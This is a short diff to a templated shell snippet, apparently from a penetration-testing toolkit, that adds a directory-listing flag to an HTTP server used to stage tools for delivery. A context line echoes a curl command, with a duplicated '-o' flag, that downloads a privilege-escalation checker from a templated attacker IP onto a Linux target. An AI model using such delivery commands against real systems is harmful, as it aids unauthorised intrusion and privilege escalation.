@@ -11,4 +11,4 @@ content: |
   echo '                       -----Linux------                         '; \
   echo 'Deliver only: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/unix-privesc-check -o -o {{ delivery_path_linux }}/unix-privesc-check'; \
   echo '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
